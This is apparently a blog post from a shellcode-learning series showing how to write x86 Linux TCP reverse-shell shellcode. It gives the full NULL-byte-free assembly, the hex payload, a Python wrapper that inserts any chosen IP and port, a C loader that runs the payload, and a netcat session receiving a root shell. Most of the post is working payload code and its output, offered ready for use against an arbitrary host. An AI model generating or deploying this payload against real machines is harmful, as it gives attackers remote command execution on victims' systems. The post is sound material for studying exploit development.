---
layout: post
title: "x86 TCP Reverse Shell"
---

## Introduction
After writing bind shell, I wanted to learnt how to create a TCP reverse shell using x86. I noticed that a high percentage of code could be taken directly from the TCP bind shell. However I chose to implement this from scratch without copy and pasting in order to confirm my newly learnt instructions and confirm I remembered the previous task of creating a bind shell and the steps taken to complete it.

## Brief Thoughts
During this task I performed similar steps to the bind shell, so to prevent a high amount of repetition within this post I will walk through the code once again however I will only explain specific sections of code that were not discussed during the completion of the TCP bind shell, making sure to cover any new C, system calls, wrapper changes and x86. Overall, I found implementing the reverse shell to be easier than the bind shell - but this may be because I had already written my first file in x86 so now this felt a little easier to work through. I had a little trouble making sure the python wrapper stomped out any NULL bytes, however that will be discussed later on in the post.

## Initial Planning
Similar to the bind shell, my first steps are to gather the information required to create my reverse shell - making sure I have all the required system call information and any additional documentation required to duplicate a C based reverse shell. The following C code presents the TCP reverse shell solution that I used as my reference:

```
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    // creating our struct for use with socket sys call
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(“127.0.0.1”)
    sa.sin_port = htons(9001);

    // first sys call
    s = socket(AF_INET, SOCK_STREAM, 0);

    // second sys call
    connect(s, (struct sockaddr *)&sa, sizeof(sa));

    // third sys call
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    
    // fourth & final sys call
    execve("/bin/sh", 0, 0);
    return 0;
}
```

Compared to the bind shell, the only new system call we can see here is the connect() function. Before we start, let’s make sure we have all the required information using the same approach as last time:

```
root@kali:~/Documents/revshell# cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep connect
#define __NR_connect 362
```

```
root@kali:~/Documents/revshell# man 2 connect
<snipped>
SYNOPSIS
       #include <sys/types.h>          /* See NOTES */
       #include <sys/socket.h>

       int connect(int sockfd, const struct sockaddr *addr,
                   socklen_t addrlen);
<snipped>
RETURN VALUE
       If  the connection or binding succeeds, zero is returned.  On error, -1
       is returned, and errno is set appropriately.
```

We can now create our table of system calls required for the reverse shell:

| System Call | C Definition | Return Value | Syscall Number |
|---|:---|:---|:---|
| socket    | int socket(int domain, int type, int protocol); | File descriptor for the new socket. | 359 (0x167)    |
| connect   | int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen); | n/a | 362 (0x16a) |
| dup2      | int dup2(int oldfd, int newfd); | n/a | 63 (0x3f) |
| execve    | int execve(const char *pathname, char *const argv[], char *const envp[]); | n/a | 11 (0xb) |  
{:.mbtablestyle}

## Crafting our Reverse Shellcode
Similar to our bind shell, we first want to create the skeleton of our script. Making sure we have our entry point and clean registers:

```
global    _start
section .text

_start:
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
```

The first system call we want to implement into our reverse shell script is the socket(). This was used within our TCP bind shell, and for that reason i won’t be explaining it as much as I did there. The implementation was the same and approach taken reflected that of my second bind shell attempt, preventing any NULL bytes from being in the final payload:

```
; syscall socket 359 (0x167)
; int socket(int domain, int type, int protocol); - returns fd
mov ax, 0x167       ; sys call number
mov bl, 0x2         ; AF_INET
mov cl, 0x1         ; SOCK_STREAM
; EDX should already be 0 from initial clear up top
    
int 0x80            ; exec syscall
mov edi, eax        ; save the fd
```

The second system call required is new to us, and required a bit of work to get up and running correctly. This call is the connect() system call. Looking at our table above, we can see that we need the following:
* our file descriptor that was returned from socket()
* a pointer to a sockaddr struct
* the size of this sockaddr struct in memory

As previously researched, the sockaddr struct contains the following data (taken from https://www.cs.cmu.edu/~srini/15-441/S10/lectures/r01-sockets.pdf):

```
struct sockaddr_in {
    short sin_family; // e.g. AF_INET
    ‏)3490(unsigned short sin_port; // e.g. htons
    struct in_addr sin_addr; // see struct in_addr, below 
    char sin_zero[8]; // zero     this if you want to
};
```

So now we have our struct definition, we want to include the following information:
* AF_INET (2)
* The port number (I used 9001 - 0x2329)
* The address (127.0.0.1 as we are listening locally)
* 0

Before walking through our implementation, we need to address the fact that the target IP address (in this case) will contain two separate 0’s, which will result in NULL bytes existing in our payload. This can be addressed in various ways, for example, h0mbre_ pushed a value into the target address and subtracted another value from it - resulting in the target value without hardcoding any 0 values. For my approach, I zeroed the register and then moved single bytes into the target areas of the register using the ‘mov byte’ instruction. I found this was also used in a NULL byte free reverse shell online at https://packetstormsecurity.com/files/154374/Linux-x86-TCP-Reverse-Shell-127.0.0.1-Nullbyte-Free-Shellcode.html. The following snippet shows my implementation and how I created my data struct, along with my target IP address (127.0.0.1) without any NULL bytes existing.

```
; create our struct
xor ecx, ecx
push ecx
mov byte [esp], 0x7f      ; now esp is: 0x0000007f
mov byte [esp+3],0x01     ; now esp is 0x0100007f
push ecx
push word 0x2923          ; port 9001
push word 0x2             ; AF_INET
mov ecx, esp              ; set the 2nd param to equal a pointer to our struct
```

As we can see above, ECX is XOR’d and pushed onto the stack (resulting in 0x00000000), we then move the value 127 (0x7f) into the lowest part of the address, followed by another move byte instruction which places the value 1 (0x1) into the highest part of the register, finally resulting in 0x0100007f - this now means the current value on the top of our stack is our local IP address, 127.0.0.1. We then complete our data struct by pushing our port number and value for AF_INET onto the stack.

Now we have our completed data struct in memory, we can implement our connect system call with each parameter correctly set ready for execution. This can seen in the following snippet:

```
; syscall connect 362 (0x16a)
; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
xor eax, eax
mov ax, 0x16a
mov ebx, edi                     ; our backed up fd from socket()

; create our struct
xor ecx, ecx
push ecx
mov byte [esp], 0x7f             ; now esp is: 0x0000007f
mov byte [esp+3],0x01            ; now esp is 0x0100007f
push ecx
push word 0x2923                 ; port 9001
push word 0x2                    ; AF_INET
mov ecx, esp                     ; set the 2nd param to equal a pointer to our struct

xor edx, edx
mov dl, 16                       ; size of struct
int 0x80
```

To quickly cover the above snippet, we start off by XOR-ing our EAX register before placing the syscall value 362 (0x16a) into the lower half of the register. Remember, we use AX instead of EAX to remove any NULL bytes in the final payload. We place the value returned by our socket() system call in our 1st parameter (EBX) before crafting our sockaddr struct. Once created and placed on the stack, as described before, we move the current value of our ESP register (pointer to the top of the stack) into our second parameter (ECX). This now satisfies the pointer requirement, described in our initial analysis of the connect system call. Finally, we xor our 3rd parameter register (EDX) and move the value 16 into the lower half of the register, stating the size of the struct. The system call is now ready to execute with the ‘int 0x80’ instruction.

We now need to call dup2() three times to set up our pipes for our final shell. Originally, in the implementation of the bind shell, I implemented three separate chunks of instructions to perform the system call with the correct parameter values. In my second draft I changed this to use a loop, decrementing the counter each time before breaking out of the loop. This time around I returned to the three separate chunks of instructions. The main reason was, I forgot how to implement a loop and I didn’t want to look back at my previous asm file for help. So I stuck with the three chunks:

```
; syscall dup2 - 3 times 63 (0x3f)
; int dup2(int oldfd, int newfd);
xor eax, eax
mov al, 0x3f
mov ebx, edi
xor ecx, ecx
int 0x80                ; first call with 0

xor eax, eax
mov al, 0x3f
mov ebx, edi
mov cl, 0x1
int 0x80                ; second call with 1

xor eax, eax
mov al, 0x3f
mov ebx, edi
mov cl, 0x2
int 0x80                ; third call with 2
```

I won’t explain this code again, as it is exactly the same as the bind shell. If you are unsure of the implementation above, please check that post.

By this point, our asm script sets up a socket, attempts to connect to a remote host and sets up our pipes ready for our new target process, in this case, it’s our “/bin/sh” shell. This means the final system call required is our execve() call. Again, this implementation came out the same as our bind shell, so again, I won’t step through it.

```
; syscall execve 11 (0xb)
xor eax, eax
push eax

; push //bin/sh and point at stack for 1st
push 0x68732f6e
push 0x69622f2f
mov ebx, esp

push eax
mov ecx, esp

push eax
mov edx, esp

xor eax, eax
mov al, 0xb
int 0x80
```

Our complete implementation can be seen below:
```
global    _start
section .text

_start:
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    ; syscall socket 359 (0x167)
    ; int socket(int domain, int type, int protocol); - returns fd
    mov ax, 0x167                     ; sys call number
    mov bl, 0x2                       ; AF_INET
    mov cl, 0x1                       ; SOCK_STREAM
    ; EDX should already be 0 from initial clear up top
    
    int 0x80                          ; exec syscall
    mov edi, eax                      ; save the fd

    ; syscall connect 362 (0x16a)
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    xor eax, eax
    mov ax, 0x16a
    mov ebx, edi                      ; our backed up fd from socket

    ; create our struct
    xor ecx, ecx
    push ecx
    mov byte [esp], 0x7f              ; now esp is: 0x0000007f
    mov byte [esp+3],0x01             ; now esp is 0x0100007f
    push ecx
    push word 0x2923                  ; port 9001
    push word 0x2                     ; AF_INET
    mov ecx, esp                      ; set the 2nd param to equal a pointer to our struct

    xor edx, edx
    mov dl, 16                        ; size of struct
    int 0x80

    ; syscall dup2 - 3 times 63 (0x3f)
    ; int dup2(int oldfd, int newfd);
    xor eax, eax
    mov al, 0x3f
    mov ebx, edi
    xor ecx, ecx
    int 0x80                          ; first call with 0

    xor eax, eax
    mov al, 0x3f
    mov ebx, edi
    mov cl, 0x1
    int 0x80                          ; second call with 1

    xor eax, eax
    mov al, 0x3f
    mov ebx, edi
    mov cl, 0x2
    int 0x80                          ; third call with 2

    ; syscall execve 11 (0xb)
    xor eax, eax
    push eax

    ; push //bin/sh and point at stack for 1st
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp

    push eax
    mov ecx, esp

    push eax
    mov edx, esp

    xor eax, eax
    mov al, 0xb
    int 0x80
```

Now the reverse shell script is complete, we want to make sure we can assemble and link it without any errors. This is done with the following:

```
root@kali:~/Documents/revshell# ../misc/build.sh first_reverse_shell
Assembling first_reverse_shell.asm
Linking first_reverse_shell.o
Done
```

At this point, I tested and confirmed that the reverse shell worked before moving on to the python wrapper that allows custom IP addresses and port values to be used within the reverse shell.

We can then dump the hex from the assembled object, and check we don’t have any NULL bytes within the output. The contents of dump_hex.sh can be seen in the first post:

```
root@kali:~/Documents/revshell# ../misc/dump_hex.sh first_reverse_shell
"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x89\\xfb\\x31\\xc9\\x51\\xc6\\x04\\x24\\x7f\\xc6\\x44\\x24\\x03\\x01\\x51\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xb1\\x01\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xb1\\x02\\xcd\\x80\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\x31\\xc0\\xb0\\x0b\\xcd\\x80"
```

## Wrapper to allow custom IP address and Port number:
Similar to the python wrapper used with our bind shell, this wrapper allows the user to specify their own port number. This number is then converted into hex values and placed within the correct position of our shellcode string. As well as the custom port number, I added functionality for custom IP addresses to be placed into the shellcode itself. I achieved this by taking the required instructions and their op codes from the 'objdump -d’ output and created four separate chunks of these instructions.

```
fourth_ip_asm = "\\xc6\\x04\\x24\\x[4]"       # movb   $0x7f,(%esp)   (127)
third_ip_asm = "\\xc6\\x44\\x24\\x01\\x[3]"   # movb   $0x1,0x1(%esp) (1)
second_ip_asm = "\\xc6\\x44\\x24\\x02\\x[2]"  # movb   $0x1,0x2(%esp) (1)
first_ip_asm = "\\xc6\\x44\\x24\\x03\\x[1]"   # movb   $0x1,0x3(%esp) (1)
```

As we can see, each string contains a tag with an integer in there, i.e [1], [2]. These tags are later replaced by the chunk of the target IP address in the correct order and in their hex value. I think we can already see where this is going, but let's continue. Once each one of these chunks has been correctly filled, the final shellcode has the tags '[i4][i3][i2][i1]' replaced with their required instructions and our final payload is complete. This is then output to the screen, ready to place in our C based injection script.

The complete python wrapper with tags that are replaced by user input can be seen below:

```
root@kali:~/Documents/revshell# cat wrapper.py 
import sys
import socket

shellcode = (
    "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3"
    "\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x6a\\x01"
    "\\x89\\xfb\\x31\\xc9\\x51[i4][i3][i2][i1]\\x51\\x66\\x68[p2][p1]"
    "\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0"
    "\\xb0\\x3f\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89"
    "\\xfb\\xb1\\x01\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xb1\\x02"
    "\\xcd\\x80\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f"
    "\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\x31\\xc0\\xb0"
    "\\x0b\\xcd\\x80"
)

fourth_ip_asm = "\\xc6\\x04\\x24\\x[4]"         # movb   $0x7f,(%esp)   (127)
third_ip_asm = "\\xc6\\x44\\x24\\x01\\x[3]"     # movb   $0x1,0x1(%esp) (1)
second_ip_asm = "\\xc6\\x44\\x24\\x02\\x[2]"    # movb   $0x1,0x2(%esp) (1)
first_ip_asm = "\\xc6\\x44\\x24\\x03\\x[1]"     # movb   $0x1,0x3(%esp) (1)

if len(sys.argv) != 3:
    print 'Usage: ' + sys.argv[0] + ' <ip> <port>'
    sys.exit()

ip = sys.argv[1]
port = sys.argv[2]
print "Chosen ip: %s" % ip
print "Chosen port: %s" % port
ip_chunks = []

try:
    socket.inet_aton(ip)
    ip_chunks = ip.split(".")
    if len(ip_chunks) < 4:
        print "Although IP appears legal, we are assuming 4 chunks (i.e 127.0.0.1)"
        sys.exit()
except socket.error:
    print "IP does not appear to be legal"
    sys.exit()

int_port = int(port)
if int_port > 65535:
    print "Port choice is greater than max value (65535)"
    sys.exit()

ip_hex_1 = hex(int(ip_chunks[0]))
ip_hex_2 = hex(int(ip_chunks[1]))
ip_hex_3 = hex(int(ip_chunks[2]))
ip_hex_4 = hex(int(ip_chunks[3]))

ip_hex_1 = ip_hex_1.replace("0x", "")
ip_hex_2 = ip_hex_2.replace("0x", "")
ip_hex_3 = ip_hex_3.replace("0x", "")
ip_hex_4 = ip_hex_4.replace("0x", "")

first_ip_asm = first_ip_asm.replace("[1]", ip_hex_1)
second_ip_asm = second_ip_asm.replace("[2]", ip_hex_2)
third_ip_asm = third_ip_asm.replace("[3]", ip_hex_3)
fourth_ip_asm = fourth_ip_asm.replace("[4]", ip_hex_4)

print first_ip_asm
print second_ip_asm
print third_ip_asm
print fourth_ip_asm

htons_port_val = socket.htons(int_port)
hex_port_value = hex(htons_port_val)

cleaned_hex_port = hex_port_value.replace("0x", "")
first_port_val = "\\x" + cleaned_hex_port[:2]
second_port_val = "\\x" + cleaned_hex_port[2:]

print "1st port: %s" % first_port_val
print "2nd port: %s" % second_port_val
print ""

print "Ammending shellcode..."
shellcode = shellcode.replace("[i4]", fourth_ip_asm)
shellcode = shellcode.replace("[i3]", third_ip_asm)
shellcode = shellcode.replace("[i2]", second_ip_asm)
shellcode = shellcode.replace("[i1]", first_ip_asm)

shellcode = shellcode.replace("[p2]", second_port_val)
shellcode = shellcode.replace("[p1]", first_port_val)

print "Final Shellcode:"
print shellcode
```

Using our wrapper:

```
root@kali:~/Documents/revshell# python wrapper.py 127.0.0.1 9005
Chosen ip: 127.0.0.1
Chosen port: 9005
\xc6\x44\x24\x03\x7f
\xc6\x44\x24\x02\x0
\xc6\x44\x24\x01\x0
\xc6\x04\x24\x1
1st port: \x2d
2nd port: \x23

Ammending shellcode...
Final Shellcode:
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x89\xfb\x31\xc9\x51\xc6\x04\x24\x1\xc6\x44\x24\x01\x0\xc6\x44\x24\x02\x0\xc6\x44\x24\x03\x7f\x51\x66\x68\x23\x2d\x66\x6a\x02\x89\xe1\x31\xd2\xb2\x10\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\xb1\x02\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\x31\xc0\xb0\x0b\xcd\x80
```

Slightly hinted at before, we can see the above out has two instances of NULL bytes due to the address containing two zeros (127.0.0.1). Due to the IP being split up into 4 chunks and then pushed onto the stack separately, these 0 values still exist. A check can be performed in the python to ignore these two instructions if the value required is a 0. They can safely be ignored as the target address is XOR’d before hand - giving us the 0 value within the target byte already. The following is the python wrapper after being adapted to handle any lone zero’s in the specified IP address:

The second draft of our Python wrapper can be seen below, preventing NULL bytes from being used in our target IP address, the main change is the four 'if statements’ that check the hex value of the IP chunk is not equal to “0”, if it is, the chunk of instructions is cleared.

```
import sys
import socket

shellcode = (
    "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3"
    "\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x6a\\x01"
    "\\x89\\xfb\\x31\\xc9\\x51[i4][i3][i2][i1]\\x51\\x66\\x68[p2][p1]"
    "\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0"
    "\\xb0\\x3f\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89"
    "\\xfb\\xb1\\x01\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xb1\\x02"
    "\\xcd\\x80\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f"
    "\\x62\\x69\\x89\\xe3\\x50\\x89\\xe1\\x50\\x89\\xe2\\x31\\xc0\\xb0"
    "\\x0b\\xcd\\x80"
)

fourth_ip_asm = "\\xc6\\x04\\x24\\x[4]"          # movb   $0x7f,(%esp)   (127)
third_ip_asm = "\\xc6\\x44\\x24\\x01\\x[3]"      # movb   $0x1,0x1(%esp) (1)
second_ip_asm = "\\xc6\\x44\\x24\\x02\\x[2]"     # movb   $0x1,0x2(%esp) (1)
first_ip_asm = "\\xc6\\x44\\x24\\x03\\x[1]"      # movb   $0x1,0x3(%esp) (1)

if len(sys.argv) != 3:
    print 'Usage: ' + sys.argv[0] + ' <ip> <port>'
    sys.exit()

ip = sys.argv[1]
port = sys.argv[2]
print "Chosen ip: %s" % ip
print "Chosen port: %s" % port
ip_chunks = []

try:
    socket.inet_aton(ip)
    ip_chunks = ip.split(".")
    if len(ip_chunks) < 4:
        print "Although IP appears legal, we are assuming 4 chunks (i.e 127.0.0.1)"
        sys.exit()
except socket.error:
    print "IP does not appear to be legal"
    sys.exit()

int_port = int(port)
if int_port > 65535:
    print "Port choice is greater than max value (65535)"
    sys.exit()

ip_hex_1 = hex(int(ip_chunks[0]))
ip_hex_2 = hex(int(ip_chunks[1]))
ip_hex_3 = hex(int(ip_chunks[2]))
ip_hex_4 = hex(int(ip_chunks[3]))

ip_hex_1 = ip_hex_1.replace("0x", "")
ip_hex_2 = ip_hex_2.replace("0x", "")
ip_hex_3 = ip_hex_3.replace("0x", "")
ip_hex_4 = ip_hex_4.replace("0x", "")

first_ip_asm = first_ip_asm.replace("[1]", ip_hex_1)
second_ip_asm = second_ip_asm.replace("[2]", ip_hex_2)
third_ip_asm = third_ip_asm.replace("[3]", ip_hex_3)
fourth_ip_asm = fourth_ip_asm.replace("[4]", ip_hex_4)

# if any of the address chunks are equal to 0, clear the value so it is ignored.
if ip_hex_1 == "0":
    first_ip_asm = ""
    print "1st IP chunk contained a NULL byte, ignoring"
else:
    print "1st IP chunk asm: %s" % first_ip_asm

if ip_hex_2 == "0":
    second_ip_asm = ""
    print "2nd IP chunk contained a NULL byte, ignoring"
else:
    print "2nd IP chunk asm: %s" % second_ip_asm

if ip_hex_3 == "0":
    third_ip_asm = ""
    print "3rd IP chunk contained a NULL byte, ignoring"
else:
    print "3rd IP chunk asm: %s" % third_ip_asm

if ip_hex_4 == "0":
    fourth_ip_asm = ""
    print "4th IP chunk contained a NULL byte, ignoring"
else:
    print "4th IP chunk asm: %s" % fourth_ip_asm

htons_port_val = socket.htons(int_port)
hex_port_value = hex(htons_port_val)

cleaned_hex_port = hex_port_value.replace("0x", "")
first_port_val = "\\x" + cleaned_hex_port[:2]
second_port_val = "\\x" + cleaned_hex_port[2:]

print "1st port: %s" % first_port_val
print "2nd port: %s" % second_port_val
print ""

print "Ammending shellcode..."
shellcode = shellcode.replace("[i4]", fourth_ip_asm)
shellcode = shellcode.replace("[i3]", third_ip_asm)
shellcode = shellcode.replace("[i2]", second_ip_asm)
shellcode = shellcode.replace("[i1]", first_ip_asm)

shellcode = shellcode.replace("[p2]", second_port_val)
shellcode = shellcode.replace("[p1]", first_port_val)

print "Final Shellcode:"
print shellcode
```

Running our Python wrapper once again produces NULL byte free shellcode that can be placed directly into our C script, allowing us to compile and inject the new payload:

```
root@kali:~/Documents/revshell# cat shell.c
#include<stdio.h>
#include<string.h>

unsigned char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x6a\x01\x89\xfb\x31\xc9\x51\xc6\x04\x24\x1\xc6\x44\x24\x03\x7f\x51\x66\x68\x23\x2d\x66\x6a\x02\x89\xe1\x31\xd2\xb2\x10\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xfb\xb1\x02\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\x31\xc0\xb0\x0b\xcd\x80";

int main(void)  {
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
```

We can finally compile our C program with the required arguments:

```
root@kali:~/Documents/revshell# gcc -fno-stack-protector -z execstack shell.c -o shell
```

We are now ready to try out our reverse shell. First we set up a listener on the specified port:

```
root@kali:~/Documents/revshell# nc -nlvp 9005
listening on [any] 9005 ...
```

We then execute our newly compiled shell:

```
root@kali:~/Documents/revshell# ./shell 
Shellcode Length:  113
```

Looking back at our listener, we notice we have the successfully caught our reverse shell and have dropped into an interactive “/bin/sh” process:

```
root@kali:~/Documents/revshell# nc -nlvp 9005
listening on [any] 9005 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 40884
id
uid=0(root) gid=0(root) groups=0(root)
```